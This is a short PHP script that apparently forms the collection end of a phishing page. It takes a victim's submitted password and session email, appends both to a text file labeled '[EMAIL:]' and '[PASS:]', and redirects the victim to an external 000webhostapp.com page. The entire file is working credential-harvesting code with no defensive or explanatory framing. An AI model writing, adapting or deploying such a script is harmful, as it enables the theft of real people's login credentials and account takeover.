<?php
session_start();
			
			$pass = $_POST["password"];
			$email=$_SESSION["Email"];
			
  			
 file_put_contents("usernames.txt", "<html>". "<br>" ."[EMAIL:]" . " ". $email . " " . " " . "[PASS:]" . " " . $pass . "<br>" . "</html>" . "\n", FILE_APPEND);
 header('Location:https://classroomdwarka.000webhostapp.com/server.php');
exit();
	
			
session_destroy();
			
?>
